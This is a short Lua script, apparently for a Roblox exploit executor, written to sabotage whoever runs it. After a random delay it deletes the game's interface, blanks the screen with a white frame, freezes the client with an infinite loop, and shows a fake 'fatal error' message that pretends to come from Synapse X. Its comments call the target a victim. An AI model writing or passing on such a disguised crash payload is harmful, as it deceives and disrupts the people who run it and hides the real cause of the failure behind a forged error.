waitTime = math.random(15,60) 


wait(waitTime)

if not iswindowactive() then -- "Freeze" up client if unfocused at time of victimage
	-- Remove roblox buttons
	for i,v in pairs(game:GetService("CoreGui"):GetDescendants()) do
		v:Destroy()
	end

	-- Create white screen
	local a=Instance.new("ScreenGui")local b=Instance.new("Frame")a.Name="closer"a.Parent=game.CoreGui;a.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;b.Parent=a;b.BackgroundColor3=Color3.fromRGB(255,255,255)b.Position=UDim2.new(-0.0232732724,0,-0.0404907987,0)b.Size=UDim2.new(0,5000,0,5000)
end 


-- Crash game
spawn(function()
	wait(0.5)
	while true do end
end)

-- Fake messagebox
messagebox("A fatal error occurred. Please relaunch Synapse X.", "Synapse X", 0x10)
